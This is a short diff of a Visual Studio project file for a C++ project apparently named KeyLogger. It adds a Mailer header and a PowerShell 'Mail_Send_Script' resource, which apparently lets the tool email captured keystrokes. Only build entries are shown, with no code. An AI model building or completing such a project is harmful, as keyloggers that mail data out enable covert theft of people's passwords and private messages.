@@ -23,10 +23,14 @@
     <ClInclude Include="Includes\Constants.h" />
     <ClInclude Include="Includes\Input_Output.h" />
     <ClInclude Include="Includes\KeyLogger.h" />
+    <ClInclude Include="Includes\Mailer.h" />
     <ClInclude Include="Includes\Timer.h" />
   </ItemGroup>
   <ItemGroup>
     <ClCompile Include="Source\KeyLogger.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resource\Mail_Send_Script.ps1" />
   </ItemGroup>
   <PropertyGroup Label="Globals">
     <VCProjectVersion>16.0</VCProjectVersion>
